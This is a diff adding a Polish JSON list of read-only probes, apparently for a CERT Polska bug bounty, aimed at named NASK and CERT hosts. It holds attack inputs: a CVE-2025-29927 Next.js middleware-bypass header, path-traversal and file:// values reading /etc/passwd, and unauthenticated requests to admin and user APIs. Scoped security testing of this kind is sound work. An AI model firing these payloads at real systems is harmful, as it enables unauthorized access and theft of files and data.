@@ -1,0 +1,253 @@
+{
+  "_opis": "Kuratowana lista sond READ-ONLY. Każda pozycja: jedna nazwana hipoteza, jeden GET. Nie ma tu fuzzingu, brute-force, testów obciążeniowych ani niczego, co zmienia stan. Klasa = numer z §8 regulaminu, dla którego wynik byłby zgłaszalny.",
+  "_zasady": "Tempo: 2 żądania/s (sufit regulaminu 5). Zakres: dokładnie hosty z scope.example.json. Zero żądań bez wcześniejszego sprawdzenia hosta.",
+  "checks": [
+    {
+      "id": "next-mw-bypass-admin",
+      "host": "oad.nask.pl",
+      "method": "GET",
+      "path": "/admin",
+      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
+      "baseline_path": "/admin",
+      "why": "CVE-2025-29927: nagłówek x-middleware-subrequest omija middleware Next.js. Różnica 200 vs 307/403 = obejście autoryzacji.",
+      "class": "9.3 / 12.1"
+    },
+    {
+      "id": "next-mw-bypass-panel",
+      "host": "oad.nask.pl",
+      "method": "GET",
+      "path": "/panel",
+      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
+      "baseline_path": "/panel",
+      "why": "j.w., inna ścieżka panelu",
+      "class": "9.3 / 12.1"
+    },
+    {
+      "id": "next-mw-bypass-zglos",
+      "host": "zglos-dezinformacje.nask.pl",
+      "method": "GET",
+      "path": "/admin",
+      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
+      "baseline_path": "/admin",
+      "why": "CVE-2025-29927 na formularzu zgłoszeń (jest tam panel obsługi zgłoszeń)",
+      "class": "9.3 / 12.1"
+    },
+    {
+      "id": "next-mw-bypass-dyzurnet",
+      "host": "dyzurnet.pl",
+      "method": "GET",
+      "path": "/admin",
+      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
+      "baseline_path": "/admin",
+      "why": "CVE-2025-29927 na dyzurnet.pl (Next.js)",
+      "class": "9.3 / 12.1"
+    },
+    {
+      "id": "next-mw-bypass-116sos",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/panel",
+      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
+      "baseline_path": "/panel",
+      "why": "CVE-2025-29927 na 116sos.pl (Next.js)",
+      "class": "9.3 / 12.1"
+    },
+    {
+      "id": "next-mw-bypass-hack",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/moje-konto",
+      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
+      "baseline_path": "/moje-konto",
+      "why": "CVE-2025-29927 na platformie (konto/zgłoszenia)",
+      "class": "9.3 / 12.1"
+    },
+    {
+      "id": "cors-oad",
+      "host": "oad.nask.pl",
+      "method": "GET",
+      "path": "/api/",
+      "headers": { "Origin": "https://arena-probe.example" },
+      "why": "Odczyt ACAO + ACAC. Tylko odbicie obcego Origin z credentials jest zgłaszalne (§8 poz. 14).",
+      "class": "14"
+    },
+    {
+      "id": "cors-zglos",
+      "host": "zglos-dezinformacje.nask.pl",
+      "method": "GET",
+      "path": "/api/health",
+      "headers": { "Origin": "https://arena-probe.example" },
+      "why": "j.w.",
+      "class": "14"
+    },
+    {
+      "id": "cors-hack-api",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/api/v1/public/institutions/cert-polska/programs/bug-bounty-cert-polska/editions/1",
+      "headers": { "Origin": "https://arena-probe.example" },
+      "why": "Publiczny endpoint JSON — sprawdzenie, czy CORS odbija dowolny Origin (przy danych publicznych to zwykle nie jest zgłaszalne, ale przy /me tak)",
+      "class": "14"
+    },
+    {
+      "id": "api-me-hack",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/api/v1/me",
+      "why": "Endpoint 'me' bez sesji. 200 z danymi = brak autoryzacji w API (§8 poz. 12.1).",
+      "class": "12.1"
+    },
+    {
+      "id": "api-users-hack",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/api/v1/users",
+      "why": "Lista użytkowników bez sesji = poz. 3.3 / 12.2",
+      "class": "12.2"
+    },
+    {
+      "id": "api-submissions-hack",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/api/v1/submissions",
+      "why": "Zgłoszenia innych badaczy bez sesji = poz. 3.2 (poufne dane)",
+      "class": "3.2"
+    },
+    {
+      "id": "api-admin-hack",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/api/v1/admin",
+      "why": "Nieudokumentowany endpoint administracyjny (§8 poz. 12.2)",
+      "class": "12.2"
+    },
+    {
+      "id": "hack-openapi",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/api/v1/openapi.json",
+      "why": "Spec API: legalna mapa endpointów do dalszej analizy",
+      "class": "info"
+    },
+    {
+      "id": "hack-swagger",
+      "host": "hack.cert.pl",
+      "method": "GET",
+      "path": "/api/docs",
+      "why": "j.w.",
+      "class": "info"
+    },
+    {
+      "id": "zglos-api-root",
+      "host": "zglos-dezinformacje.nask.pl",
+      "method": "GET",
+      "path": "/api",
+      "why": "Mapa API formularza zgłoszeń (potem: POST z załącznikiem, pole 'link')",
+      "class": "info"
+    },
+    {
+      "id": "oad-podglad-external",
+      "host": "oad.nask.pl",
+      "method": "GET",
+      "path": "/podglad-pdf?url=https%3A%2F%2Fexample.com%2F",
+      "why": "Czy 'podglad-pdf' pobiera zasób po stronie serwera (SSRF poz. 5). Wcześniej: 500.",
+      "class": "5"
+    },
+    {
+      "id": "oad-podglad-file",
+      "host": "oad.nask.pl",
+      "method": "GET",
+      "path": "/podglad-pdf?url=file%3A%2F%2F%2Fetc%2Fpasswd",
+      "why": "Czy schemat file:// jest przyjmowany (LFI poz. 15).",
+      "class": "15"
+    },
+    {
+      "id": "science-media-traversal",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/media/..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "why": "Proxy /api/media/<path> do WordPressa — traversal (poz. 15).",
+      "class": "15"
+    },
+    {
+      "id": "dns-pl-node-search",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/wyszukiwarka?q=test",
+      "why": "Mapa wyszukiwarki domen (Drupal) — punkt wejścia pod SQLi/refleksję.",
+      "class": "info"
+    },
+    {
+      "id": "dns-pl-whois",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/whois?domain=nask.pl",
+      "why": "Publiczny whois — sprawdzenie, czy parametr jest odzwierciedlany/walidowany.",
+      "class": "info"
+    },
+    {
+      "id": "nask-www-redirect",
+      "host": "nask.pl",
+      "method": "GET",
+      "path": "/",
+      "why": "Łańcuch przekierowań: czy nie wychodzi poza zakres (notujemy tylko).",
+      "class": "info"
+    },
+    {
+      "id": "cert-pl-home",
+      "host": "cert.pl",
+      "method": "GET",
+      "path": "/",
+      "why": "Mapa CERT Polska Tier 1: tech, formularze, endpointy.",
+      "class": "info"
+    },
+    {
+      "id": "moje-cert-home",
+      "host": "moje.cert.pl",
+      "method": "GET",
+      "path": "/",
+      "why": "Aplikacja z kontami — najbardziej prawdopodobne miejsce na BAC/IDOR.",
+      "class": "info"
+    },
+    {
+      "id": "moje-cert-api-me",
+      "host": "moje.cert.pl",
+      "method": "GET",
+      "path": "/api/me",
+      "why": "Endpoint konta bez sesji.",
+      "class": "12.1"
+    },
+    {
+      "id": "incydent-home",
+      "host": "incydent.cert.pl",
+      "method": "GET",
+      "path": "/",
+      "why": "Formularz zgłaszania incydentów — wejście pod upload/SSRF.",
+      "class": "info"
+    },
+    {
+      "id": "mwdb-api-root",
+      "host": "mwdb.cert.pl",
+      "method": "GET",
+      "path": "/api/",
+      "why": "mwdb (malware DB) — dokumentacja API, potem własne konto.",
+      "class": "info"
+    },
+    {
+      "id": "mwdb-server-info",
+      "host": "mwdb.cert.pl",
+      "method": "GET",
+      "path": "/api/server/info",
+      "why": "Wersja/informacje serwera (użyteczne do dopasowania CVE; sama wersja nie jest zgłaszalna).",
+      "class": "info"
+    },
+    {
+      "id": "ctf-hack-home",
+      "host": "ctf.hack.cert.pl",
+      "method": "GET",
+      "path": "/",
+      "why": "Jedyna subdomena hack.cert.pl w zakresie (niejednoznaczność karta vs PDF — sprawdzamy dostępność, nie testujemy).",
+      "class": "info"
+    }
+  ]
+}
